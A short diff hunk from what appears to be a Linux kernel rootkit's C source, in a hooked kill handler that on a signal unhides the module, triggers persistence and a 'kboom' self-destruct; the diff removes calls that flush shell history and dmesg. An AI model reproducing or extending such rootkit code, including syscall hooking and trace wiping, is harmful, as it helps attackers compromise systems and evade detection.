@@ -59,8 +59,6 @@ int new_kill(const struct pt_regs *pt_regs)
             module_show();
             kboom_persistence();
             kboom();
-            flush_history();
-            flush_dmesg();
             printk(KERN_INFO "CALL SELFDESTRUCT WITH SIG");
             break;
         default:
